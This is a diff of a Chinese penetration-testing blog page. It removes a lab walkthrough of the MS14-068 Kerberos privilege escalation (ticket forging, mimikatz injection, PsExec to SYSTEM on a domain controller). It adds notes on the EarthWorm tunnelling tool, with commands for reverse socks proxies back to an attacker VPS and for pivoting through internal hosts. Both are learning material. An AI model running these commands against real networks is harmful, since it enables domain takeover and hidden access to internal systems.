@@ -48,31 +48,18 @@
   };
 </script>
 
-  <meta name="description" content="前言这几天在研究MS14-068域普通用户提权的问题，自己搭建了域环境，使用普通域用户死活提不上权限。现在终于解决了，所以把研究过程记一下。">
+  <meta name="description" content="EW链路模式和参数">
 <meta name="keywords" content="记录">
 <meta property="og:type" content="article">
-<meta property="og:title" content="MS14-068排错笔记">
-<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;01&#x2F;09&#x2F;MS14-068%E6%8E%92%E9%94%99+%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0&#x2F;index.html">
+<meta property="og:title" content="ew使用笔记">
+<meta property="og:url" content="http:&#x2F;&#x2F;yoursite.com&#x2F;2020&#x2F;06&#x2F;22&#x2F;ew%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0&#x2F;index.html">
 <meta property="og:site_name" content="LionKing">
-<meta property="og:description" content="前言这几天在研究MS14-068域普通用户提权的问题，自己搭建了域环境，使用普通域用户死活提不上权限。现在终于解决了，所以把研究过程记一下。">
+<meta property="og:description" content="EW链路模式和参数">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;01&#x2F;09&#x2F;Dx3HdOJXvgQLSUe.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;01&#x2F;09&#x2F;etgNC2fjWMI6Zv7.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;01&#x2F;09&#x2F;i4FLAyTIpCGkWRz.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;01&#x2F;09&#x2F;bOD34qn8CPYRrjk.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;01&#x2F;09&#x2F;C8m2XV63IKjzMtd.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;01&#x2F;09&#x2F;SUmtaoL2AQMR5ZD.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;01&#x2F;09&#x2F;mBG8LKohAZfrERI.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;01&#x2F;09&#x2F;fD958LTjwCUNvJq.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;01&#x2F;09&#x2F;Bjp6xfNRreKqLyD.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;01&#x2F;09&#x2F;qs5OaY7zHCybkZN.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;01&#x2F;09&#x2F;rK3oDBlA2m8zdIx.png">
-<meta property="og:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;01&#x2F;09&#x2F;tO6l25Wq3ak4VIT.png">
-<meta property="og:updated_time" content="2020-06-18T04:19:48.955Z">
+<meta property="og:updated_time" content="2020-06-23T14:48:34.693Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:image" content="https:&#x2F;&#x2F;i.loli.net&#x2F;2020&#x2F;01&#x2F;09&#x2F;Dx3HdOJXvgQLSUe.png">
 
-<link rel="canonical" href="http://yoursite.com/2020/01/09/MS14-068%E6%8E%92%E9%94%99+%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/">
+<link rel="canonical" href="http://yoursite.com/2020/06/22/ew%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/">
 
 
 <script id="page-configurations">
@@ -86,7 +73,7 @@
   };
 </script>
 
-  <title>MS14-068排错笔记 | LionKing</title>
+  <title>ew使用笔记 | LionKing</title>
   
 
 
@@ -217,7 +204,7 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/01/09/MS14-068%E6%8E%92%E9%94%99+%E5%A4%8D%E7%8E%B0%E7%AC%94%E8%AE%B0/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/06/22/ew%E4%BD%BF%E7%94%A8%E7%AC%94%E8%AE%B0/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="image" content="/images/avatar.jpeg">
@@ -230,7 +217,7 @@
     </span>
       <header class="post-header">
         <h1 class="post-title" itemprop="name headline">
-          MS14-068排错笔记
+          ew使用笔记
         </h1>
 
         <div class="post-meta">
@@ -240,14 +227,14 @@
               </span>
               <span class="post-meta-item-text">发表于</span>
 
-              <time title="创建时间：2020-01-09 17:09:29" itemprop="dateCreated datePublished" datetime="2020-01-09T17:09:29+08:00">2020-01-09</time>
+              <time title="创建时间：2020-06-22 23:10:29" itemprop="dateCreated datePublished" datetime="2020-06-22T23:10:29+08:00">2020-06-22</time>
             </span>
               <span class="post-meta-item">
                 <span class="post-meta-item-icon">
                   <i class="fa fa-calendar-check-o"></i>
                 </span>
                 <span class="post-meta-item-text">更新于</span>
-                <time title="修改时间：2020-06-18 12:19:48" itemprop="dateModified" datetime="2020-06-18T12:19:48+08:00">2020-06-18</time>
+                <time title="修改时间：2020-06-23 22:48:34" itemprop="dateModified" datetime="2020-06-23T22:48:34+08:00">2020-06-23</time>
               </span>
 
           
@@ -261,51 +248,63 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这几天在研究MS14-068域普通用户提权的问题，自己搭建了域环境，使用普通域用户死活提不上权限。现在终于解决了，所以把研究过程记一下。</p><a id="more"></a>
-<h2 id="问题：mimikatz导入凭证后依然“拒绝访问”域控文件"><a href="#问题：mimikatz导入凭证后依然“拒绝访问”域控文件" class="headerlink" title="问题：mimikatz导入凭证后依然“拒绝访问”域控文件"></a>问题：mimikatz导入凭证后依然“拒绝访问”域控文件</h2><h3 id="可能点一：mimikatz将凭证注入内存不成功"><a href="#可能点一：mimikatz将凭证注入内存不成功" class="headerlink" title="可能点一：mimikatz将凭证注入内存不成功"></a>可能点一：mimikatz将凭证注入内存不成功</h3><p>mimikatz在注入凭证后，使用”kerberos::list”看一下是否当前凭证只有一个，若只有一个则说明注入成功。<br>若有多个，如下图所示：<br><img src="https://i.loli.net/2020/01/09/Dx3HdOJXvgQLSUe.png" alt="Image 10.png"><br>则说明伪造的凭证“可能”注入成功，但是后续访问域控共享文件“任然”可能失败。<br>若一个都没有，”kerberos::list”为空，则说明凭证注入失败，则需要多试几次，或者使用更高级权限的mimikatz注入试试<br><img src="https://i.loli.net/2020/01/09/etgNC2fjWMI6Zv7.png" alt="Image 11.png"></p>
-<h3 id="可能点二：域控未安装“域证书服务”（这次失败点就在于此）"><a href="#可能点二：域控未安装“域证书服务”（这次失败点就在于此）" class="headerlink" title="可能点二：域控未安装“域证书服务”（这次失败点就在于此）"></a>可能点二：域控未安装“域证书服务”（这次失败点就在于此）</h3><p>因为是新手，对域控环境搭建不是很熟悉，所以我在搭建域控环境的时候，只安装了“域服务”和“DNS服务”（如下图红框所示），并未在意“AD证书服务”的安装（如下图箭头所示）。经过后续尝试才发现需要安装这个服务，才能成功进入域控文件共享。<br><img src="https://i.loli.net/2020/01/09/i4FLAyTIpCGkWRz.png" alt="Image 12.png"></p>
-<h2 id="MS14-068漏洞复现"><a href="#MS14-068漏洞复现" class="headerlink" title="MS14-068漏洞复现"></a>MS14-068漏洞复现</h2><p>MS14-068漏洞可以将一个普通域用户提升到域管权限，从而进行后续的横向渗透，该漏洞有几个必要条件：</p>
-<ul>
-<li>域控上无KB3011780补丁</li>
-<li>拥有一台域内机器的控制权限</li>
-<li>拥有一个域账户的SID、账号、密码/hash</li>
-</ul>
-<h3 id="工具下载："><a href="#工具下载：" class="headerlink" title="工具下载："></a>工具下载：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Ms14-068.exe 下载地址: https://github.com/abatchy17/WindowsExploits/tree/master/MS14-068</span><br><span class="line"></span><br><span class="line">PSexec 下载地址: https://github.com/crupper/Forensics-Tool-Wiki/blob/master/windowsTools/PsExec64.exe</span><br><span class="line"></span><br><span class="line">mimikatz 下载地址: https://github.com/gentilkiwi/mimikatz/releases</span><br></pre></td></tr></table></figure>
-
-<h3 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h3><p>获取普通域用户SID:</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whoami /user</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2020/01/09/bOD34qn8CPYRrjk.png" alt="Image 13.png"></p>
-<p>获取域控主机名/IP地址</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">net group &quot;Domain controllers&quot; /domain</span><br><span class="line">********</span><br><span class="line">ping 主机名</span><br></pre></td></tr></table></figure>
-
-<p>注意不要带$符号</p>
-<p><img src="https://i.loli.net/2020/01/09/C8m2XV63IKjzMtd.png" alt="Image 14.png"></p>
-<p>测试是否可以访问域控共享文件</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dir \\域控主机名.域名\c$</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2020/01/09/SUmtaoL2AQMR5ZD.png" alt="Image 16.png"></p>
-<p>可以看到显示“拒绝访问”，这是正常，域普通用户当然没有权限访问域控共享文件，现在我们需要使用MS14-068提权。</p>
-<p><img src="https://i.loli.net/2020/01/09/mBG8LKohAZfrERI.png" alt="Image 18.png"></p>
-<p>MS14-068需要几个必要的参数，SID、域用户名、域控地址，另外还需要密码，若没有密码可以使用–rc4来使用hsah生成凭证</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">S14-068.exe -u test1@testaa.com -s S-1-5-21-1054765563-66723455-3431114319-1104 -d WIN-GPBP3K667HC.testaa.com -p X*******</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2020/01/09/fD958LTjwCUNvJq.png" alt="Image 19.png"></p>
-<p>进入mimikatz</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">kerberos::list   //查看当前凭证</span><br><span class="line">kerberos::purge  //清除凭证</span><br><span class="line">kerberos::list   //再次查看，确保无凭证</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2020/01/09/Bjp6xfNRreKqLyD.png" alt="Image 20.png"></p>
-<p>使用如下命令导入刚刚生成的伪造凭证</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">kerberos::ptc 凭证地址</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2020/01/09/qs5OaY7zHCybkZN.png" alt="Image 21.png"></p>
-<p>再次访问域控的共享文件，即可发现已经成功列出目录了</p>
-<p><img src="https://i.loli.net/2020/01/09/rK3oDBlA2m8zdIx.png" alt="Image 22.png"></p>
-<p>使用Psexec64.exe横向移动</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psesec.exe -accepteula \\IPaddress -s cmd.exe</span><br></pre></td></tr></table></figure>
-
-<p><img src="https://i.loli.net/2020/01/09/tO6l25Wq3ak4VIT.png" alt="Image 24.png"></p>
-<p>可以观察到命令提示符已经变了，且用户权限为域控的system权限（由于Psexec64.exe的-s原因）。看IP地址也可知晓已经成功登陆域控机器了。</p>
+        <h2 id="EW链路模式和参数"><a href="#EW链路模式和参数" class="headerlink" title="EW链路模式和参数"></a>EW链路模式和参数</h2><a id="more"></a><h3 id="六种链路状态："><a href="#六种链路状态：" class="headerlink" title="六种链路状态："></a>六种链路状态：</h3><p>ssocksd 正向本地 socks代理</p>
+<p>rssocks 反向 socks代理（server） </p>
+<p>rcsocks 反向 socks代理（client）</p>
+<p>lcx_slave  将远程主机的端口 与 另一台主机的端口建立转发关系</p>
+<p>lcx_tran  将本地端口转发至远程主机</p>
+<p>lcx_listen 本地端口转发，本地端口之间建立转发关系</p>
+<h3 id="参数信息："><a href="#参数信息：" class="headerlink" title="参数信息："></a>参数信息：</h3><p>-l 指定要监听的本地端口</p>
+<p>-d 指定要反弹到的机器 ip</p>
+<p>-e 指定要反弹到的机器端口</p>
+<p>-f 指定要主动连接的机器 ip</p>
+<p>-g 指定要主动连接的机器端口</p>
+<p>-t 指定超时时长,默认为 1000</p>
+<h2 id="socks隧道"><a href="#socks隧道" class="headerlink" title="socks隧道"></a>socks隧道</h2><h3 id="普通环境："><a href="#普通环境：" class="headerlink" title="普通环境："></a>普通环境：</h3><ol>
+<li>目标网络边界存在公网IP且可任意开监听端口：（正向代理）<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">                      目标公网机器A</span><br><span class="line">+---------+    	  +-------------------+  </span><br><span class="line">|HackTools|  -&gt;&gt;  | 8888 -&gt; 1.1.1.1   |</span><br><span class="line">+---------+    	  +-------------------+</span><br></pre></td></tr></table></figure>
+公网IP_A = 1.1.1.1 执行如下</li>
+</ol>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 8888   // 在 1.1.1.1 主机上通过这个命令开启 8888 端口的 socks 代理</span><br></pre></td></tr></table></figure>
+<p>HackTools 可通过访问 1.1.1.1:8888 端口使用 1.1.1.1 主机提供的代理</p>
+<p>2.目标网络边界不存在公网 IP（能出网），需要通过反弹方式创建 socks 代理：（反向代理）</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">                    自控公网VPS_IP                       可控边界主机A</span><br><span class="line">+---------+     +--------------------------+    |     	+-------------+</span><br><span class="line">|HackTools| -&gt;&gt; | 1080 -&gt;  1.1.1.1 -&gt; 8888 |  防火墙 	| &lt;- 2.2.2.2  |</span><br><span class="line">+---------+     +--------------------------+    |    	+-------------+</span><br></pre></td></tr></table></figure>
+<p>VPS_IP = 1.1.1.1 执行如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rcsocks -l 1080 -e 8888  //在 1.1.1.1 的自控公网VPS主机上添加转接隧道，将 1080 收到的代理请求转交给反连 8888 端口的主机</span><br></pre></td></tr></table></figure>
+<p>内网IP_A =2.2.2.2 执行如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s rssocks -d 1.1.1.1 -e 8888  //将目标网络的可控边界主机A反向连接自控公网VPS主机的8888端口</span><br></pre></td></tr></table></figure>
+<p>HackTools 可通过访问 1.1.1.1:1080 端口使用 2.2.2.2 主机提供的 socks5 代理服务</p>
+<h3 id="对于二重网络环境："><a href="#对于二重网络环境：" class="headerlink" title="对于二重网络环境："></a>对于二重网络环境：</h3><p>1.获得目标网络内网两台主机 A、B 的权限，情况描述如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">                    可控边界主机A                 可访问指定资源的内网主机B</span><br><span class="line">+---------+    	 +-----------------------+     	 +-----------------+</span><br><span class="line">|HackTools| -&gt;&gt;  | 1080 --&gt;  1.1.1.1 --&gt; | 	-&gt;&gt;  | 9999 -&gt; 2.2.2.2 |</span><br><span class="line">+---------+      +-----------------------+     	 +-----------------+</span><br></pre></td></tr></table></figure>
+<p>A 主机：  存在公网 IP和内网IP，且自由监听任意端口，无法访问特定资源</p>
+<p>B 主机：  目标网络内部主机，可访问特定资源，但无法访问公网</p>
+<p>A 主机可直连 B 主机</p>
+<p>内网IP_B =2.2.2.2 执行如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 9999  // 在 2.2.2.2 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理</span><br></pre></td></tr></table></figure>
+<p>边界IP_A = 1.1.1.1 执行如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_tran -l 1080 -f 2.2.2.2 -g 9999  // 将 1080 端口收到的 socks 代理请求转交给 2.2.2.2 的主机。</span><br></pre></td></tr></table></figure>
+<p>HackTools 可通过访问 1.1.1.1:1080 来使用 2.2.2.2 主机提供的 socks5 代理。</p>
+<p>2.获得目标网络内两台主机 A、B 的权限，情况描述如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">                   	自控公网VPS_IP                       可控边界主机A       	     可访问指定资源的主机B</span><br><span class="line">+---------+   	 +--------------------------+     |    +-----------------+     	 +-----------------+</span><br><span class="line">|HackTools|  -&gt;&gt; | 1080 -&gt;  1.1.1.1 -&gt; 8888 |  防火墙  | &lt;--  2.2.2.2 --&gt; | -&gt;&gt;  | 9999 -&gt; 3.3.3.3 |</span><br><span class="line">+---------+ 	 +--------------------------+     |    +-----------------+     	 +-----------------+</span><br></pre></td></tr></table></figure>
+<p>A 主机：  目标网络的边界主机，无公网 IP，有内网IP（可出网），但无法访问特定资源。</p>
+<p>B 主机：  目标网络内部主机，可访问特定资源，却无法回连公网</p>
+<p>A 主机可直连 B 主机</p>
+<p>VPS_IP= 1.1.1.1 执行如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_listen -l 1080 -e 8888  // 在 1.1.1.1 公网主机添加转接隧道，将 1080 收到的代理请求转交给反连 8888 端口的主机</span><br></pre></td></tr></table></figure>
+<p>内网IP_A= 2.2.2.2 执行如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_slave -d 1.1.1.1 -e 8888 -f 3.3.3.3 -g 9999  // 在 2.2.2.2 上，通过工具的 lcx_slave 方式，打通1.1.1.1:8888 和 3.3.3.3:9999 之间的通讯隧道</span><br></pre></td></tr></table></figure>
+<p>内网IP_B= 3.3.3.3 执行如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s ssocksd -l 9999 // 在 3.3.3.3 主机上利用 ssocksd 方式启动 9999 端口的 socks 代理</span><br></pre></td></tr></table></figure>
+<p>HackTools 可通过访问 1.1.1.1:1080 来使用 3.3.3.3 主机提供的 socks5 代理</p>
+<h2 id="端口转发"><a href="#端口转发" class="headerlink" title="端口转发"></a>端口转发</h2><h3 id="正向转发："><a href="#正向转发：" class="headerlink" title="正向转发："></a>正向转发：</h3><p>拥有公网IP和内网IP的双网卡边界主机A和内网主机B=1.1.1.1在同一个内网</p>
+<p>边界主机A 执行如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_tran -l 33890 -f 1.1.1.1 -g 3389</span><br></pre></td></tr></table></figure>
+<p>连接A的33890端口即可连接内网B的3389</p>
+<h3 id="反向转发："><a href="#反向转发：" class="headerlink" title="反向转发："></a>反向转发：</h3><p>自控VPS_IP=1.1.1.1 执行如下</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_listen -l 3380 -e 33890</span><br></pre></td></tr></table></figure>
+<p>可出网边界主机B=2.2.2.2 执行如下，内网不出网机器C=3.3.3.3</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">./ew -s lcx_slave -d 1.1.1.1 -e 33890 -f 3.3.3.3 -g 3389</span><br></pre></td></tr></table></figure>
+<p>连接自控VPS_IP主机的3380端口即可访问C机器的3389</p>
+<h4 id="值得注意的问题："><a href="#值得注意的问题：" class="headerlink" title="值得注意的问题："></a>值得注意的问题：</h4><p>如上环境和命令，区别为可出网边界主机B=2.2.2.2为本地win10，内网不出网机器C=3.3.3.3为虚拟机win7<br>发现不能通过自控VPS_IP主机的3380端口连接win7的3389，疑似为win7在虚拟机中登录后占用了“本地”“连接”“本地远程桌面”的会话（单用户模式？）</p>
 
     </div>
 
@@ -322,16 +321,16 @@
 
           <div class="post-nav">
             <div class="post-nav-next post-nav-item">
-                <a href="/2019/12/13/%E8%AE%B0%E3%80%8A%E5%8E%9F%E5%88%99%E3%80%8B/" rel="next" title="记《原则》">
-                  <i class="fa fa-chevron-left"></i> 记《原则》
+                <a href="/2020/06/18/%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8Tips/" rel="next" title="内网安全Tips">
+                  <i class="fa fa-chevron-left"></i> 内网安全Tips
                 </a>
             </div>
 
             <span class="post-nav-divider"></span>
 
             <div class="post-nav-prev post-nav-item">
-                <a href="/2020/01/10/%E5%85%B3%E4%BA%8E%E5%89%8D%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0%E7%9A%84mimikatz%E5%90%8E%E7%BB%AD%E7%A0%94%E7%A9%B6/" rel="prev" title="关于前一篇文章的mimikatz后续研究">
-                  关于前一篇文章的mimikatz后续研究 <i class="fa fa-chevron-right"></i>
+                <a href="/2020/06/23/phpinfo_scanner%E5%BF%BD%E7%95%A5%E8%AF%81%E4%B9%A6%E9%94%99%E8%AF%AF%E4%BF%AE%E6%94%B9/" rel="prev" title="phpinfo_scanner忽略证书错误修改">
+                  phpinfo_scanner忽略证书错误修改 <i class="fa fa-chevron-right"></i>
                 </a>
             </div>
           </div>
@@ -376,7 +375,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#问题：mimikatz导入凭证后依然“拒绝访问”域控文件"><span class="nav-number">2.</span> <span class="nav-text">问题：mimikatz导入凭证后依然“拒绝访问”域控文件</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#可能点一：mimikatz将凭证注入内存不成功"><span class="nav-number">2.1.</span> <span class="nav-text">可能点一：mimikatz将凭证注入内存不成功</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#可能点二：域控未安装“域证书服务”（这次失败点就在于此）"><span class="nav-number">2.2.</span> <span class="nav-text">可能点二：域控未安装“域证书服务”（这次失败点就在于此）</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#MS14-068漏洞复现"><span class="nav-number">3.</span> <span class="nav-text">MS14-068漏洞复现</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#工具下载："><span class="nav-number">3.1.</span> <span class="nav-text">工具下载：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.2.</span> <span class="nav-text">漏洞利用</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#EW链路模式和参数"><span class="nav-number">1.</span> <span class="nav-text">EW链路模式和参数</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#六种链路状态："><span class="nav-number">1.1.</span> <span class="nav-text">六种链路状态：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#参数信息："><span class="nav-number">1.2.</span> <span class="nav-text">参数信息：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#socks隧道"><span class="nav-number">2.</span> <span class="nav-text">socks隧道</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#普通环境："><span class="nav-number">2.1.</span> <span class="nav-text">普通环境：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#对于二重网络环境："><span class="nav-number">2.2.</span> <span class="nav-text">对于二重网络环境：</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#端口转发"><span class="nav-number">3.</span> <span class="nav-text">端口转发</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#正向转发："><span class="nav-number">3.1.</span> <span class="nav-text">正向转发：</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#反向转发："><span class="nav-number">3.2.</span> <span class="nav-text">反向转发：</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#值得注意的问题："><span class="nav-number">3.2.1.</span> <span class="nav-text">值得注意的问题：</span></a></li></ol></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
